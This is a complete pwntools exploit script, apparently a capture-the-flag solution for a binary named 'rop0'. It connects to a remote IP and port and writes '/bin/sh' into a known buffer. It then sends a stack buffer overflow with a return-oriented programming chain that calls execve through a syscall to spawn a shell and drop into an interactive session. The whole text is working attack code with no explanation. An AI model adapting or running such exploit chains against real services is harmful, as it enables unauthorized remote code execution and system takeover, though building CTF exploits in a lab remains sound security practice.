from pwn import *

pop_rdx = 0x4428e6
pop_rax = 0x409a34
pop_rdi = 0x401516
pop_rsi = 0x401637
syscall = 0x4003da
push_rsp = 0x41be4a
push_rbx = 0x40d789
buf2 = 0x6ccd60
# 0x4880b6: push rax ; mov rax, rbx ; pop rbx ; ret


r = remote('140.110.112.77', 3121)
#r = process('rop0')
raw_input('debug')
r.sendline('/bin/sh\0')

r.recvuntil('\n')
payload = p64(pop_rdx) + p64(0)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdi) + p64(buf2)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)
r.sendline('a' * 0x28 + payload)
r.interactive()
